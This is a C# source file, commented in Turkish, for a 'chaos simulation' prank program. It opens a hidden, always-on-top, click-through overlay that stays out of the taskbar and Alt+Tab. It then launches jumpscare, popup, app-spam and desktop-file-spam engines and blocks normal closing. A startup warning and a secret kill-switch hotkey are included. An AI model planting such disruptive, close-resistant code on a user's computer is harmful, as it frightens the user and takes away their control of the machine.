using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace ChaosVisualAudioSimulation
{
    /// <summary>
    /// ANA FORM — tam ekran, GÖRÜNMEZ (TransparencyKey), görev çubuğunda ve
    /// Alt+Tab'da görünmeyen, tıklama-geçirgen overlay.
    ///
    /// Sorumluluklar:
    ///   (1) Açılış sekansı: CMD -> Windows uyarısı -> animasyonlar,
    ///   (2) Tüm kaos motorlarını başlatır,
    ///   (3) Gizli kill-switch (CTRL+SHIFT+ALT+K) dinler,
    ///   (4) Alt+F4 / X butonu ile kapanmayı engeller.
    /// </summary>
    public sealed class MainForm : Form
    {
        private const int HotKeyId = 0xC0DE;

        private readonly VisualEngine _visual = new VisualEngine(AppConfig.VisualIntervalMs);
        private readonly AudioEngine _audio = new AudioEngine();
        private readonly JumpscareEngine _jumpscare = new JumpscareEngine(intervalMs: 30);
        private readonly PopupEngine _popups = new PopupEngine(AppConfig.PopupIntervalMs);
        private readonly AppSpamEngine _appSpam = new AppSpamEngine(AppConfig.AppSpamIntervalMs);
        private readonly DesktopFileSpamEngine _fileSpam = new DesktopFileSpamEngine(AppConfig.FileSpamIntervalMs);
        private readonly Timer _startupTimer;

        private bool _shuttingDown;
        private bool _chaosStarted;

        public MainForm()
        {
            ConfigureWindow();

            _startupTimer = new Timer { Interval = AppConfig.StartupDelaySeconds * 1000 };
            _startupTimer.Tick += OnStartupTick;
            _startupTimer.Start();
        }

        // ==================================================================
        // PENCERE YAPILANDIRMASI
        // ==================================================================
        private void ConfigureWindow()
        {
            FormBorderStyle = FormBorderStyle.None;
            ShowInTaskbar = false;
            TopMost = true;
            StartPosition = FormStartPosition.Manual;

            BackColor = Color.Black;
            TransparencyKey = Color.Black;

            int x = NativeMethods.GetSystemMetrics(NativeMethods.SM_XVIRTUALSCREEN);
            int y = NativeMethods.GetSystemMetrics(NativeMethods.SM_YVIRTUALSCREEN);
            int w = Math.Max(1, NativeMethods.GetSystemMetrics(NativeMethods.SM_CXVIRTUALSCREEN));
            int h = Math.Max(1, NativeMethods.GetSystemMetrics(NativeMethods.SM_CYVIRTUALSCREEN));
            Bounds = new Rectangle(x, y, w, h);

            FormClosing += OnFormClosing;
            KeyDown += OnKeyDown;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= NativeMethods.WS_EX_TOOLWINDOW;
                cp.ExStyle |= NativeMethods.WS_EX_TRANSPARENT;
                return cp;
            }
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            NativeMethods.RegisterHotKey(Handle, HotKeyId, AppConfig.KillModifiers, AppConfig.KillVirtualKey);
        }

        // ==================================================================
        // AÇILIŞ SEKANSI: CMD -> Windows uyarısı -> animasyonlar
        // ==================================================================
        private void OnStartupTick(object? sender, EventArgs e)
        {
            _startupTimer.Stop();

            // 1) CMD penceresi aç.
            if (AppConfig.OpenCmdOnStart)
            {
                TryOpen("cmd.exe");
            }

            // 2) Windows uyarısı (kullanıcı Tamam'a basana kadar bekler).
            if (AppConfig.ShowStartupWarning)
            {
                MessageBox.Show(
                    AppConfig.StartupWarningText,
                    AppConfig.StartupWarningTitle,
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button1,
                    MessageBoxOptions.DefaultDesktopOnly);
            }

            // 3) Kaos başlar: kara duvar kağıdı + tüm motorlar.
            StartChaos();
        }

        private void StartChaos()
        {
            if (_chaosStarted) return;
            _chaosStarted = true;

            _visual.Start();
            _audio.Start();

            if (AppConfig.ScareEnabled)
            {
                _jumpscare.Start();
            }
            if (AppConfig.PopupsEnabled)
            {
                _popups.Start();
            }
            if (AppConfig.AppSpamEnabled)
            {
                _appSpam.Start();
            }
            if (AppConfig.FileSpamEnabled)
            {
                _fileSpam.Start();
            }
        }

        private static void TryOpen(string target)
        {
            try
            {
                Process.Start(new ProcessStartInfo(target) { UseShellExecute = true });
            }
            catch
            {
                // bulunamazsa sessizce geç
            }
        }

        // ==================================================================
        // KAPANIŞ ENGELLEME (Alt+F4 / X butonu)
        // ==================================================================
        private void OnFormClosing(object? sender, FormClosingEventArgs e)
        {
            if (_shuttingDown)
            {
                e.Cancel = false;
                return;
            }
            e.Cancel = true; // normal kapanış engellenir
        }

        // ==================================================================
        // KILL-SWITCH
        // ==================================================================
        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            if (e.Control && e.Shift && e.Alt && e.KeyCode == Keys.K)
            {
                Program.EmergencyStop();
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == NativeMethods.WM_HOTKEY && m.WParam.ToInt32() == HotKeyId)
            {
                Program.EmergencyStop();
                return;
            }
            base.WndProc(ref m);
        }

        // ==================================================================
        // GÜVENLİ KAPANIŞ
        // ==================================================================
        internal void SafeShutdown()
        {
            if (_shuttingDown) return;
            _shuttingDown = true;

            try
            {
                _startupTimer.Stop();
                _audio.Stop();
                _visual.Stop();
                _jumpscare.Stop();
                _popups.Stop();
                _appSpam.Stop();
                _fileSpam.Stop();

                _visual.RestoreScreen();

                NativeMethods.UnregisterHotKey(Handle, HotKeyId);
            }
            catch
            {
                // temizlik hataları kapanışı engellemesin
            }

            Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _visual.Dispose();
                _audio.Dispose();
                _jumpscare.Dispose();
                _popups.Dispose();
                _appSpam.Dispose();
                _fileSpam.Dispose();
                _startupTimer.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
